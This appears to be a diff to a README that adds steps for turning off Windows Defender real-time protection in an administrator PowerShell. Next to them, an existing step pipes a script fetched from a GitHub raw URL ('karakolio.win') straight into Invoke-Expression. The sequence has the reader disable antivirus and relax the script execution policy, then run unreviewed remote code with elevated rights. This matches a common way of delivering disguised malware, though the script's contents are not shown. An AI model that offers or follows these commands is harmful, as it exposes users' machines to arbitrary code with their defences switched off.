@@ -26,6 +26,14 @@ Once finished, type `Set-ExecutionPolicy Restricted`
 Press Enter
 Type Exit
 
+Using PowerShell (as an administrator) in Windows 10, use the following command:
+```cmd
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+To re-enable it:
+```cmd
+Set-MpPreference -DisableRealtimeMonitoring $false
+```
 ```cmd
 irm https://raw.githubusercontent.com/asc3t1c/karakolio/refs/heads/main/karakolio.win | iex
 ```
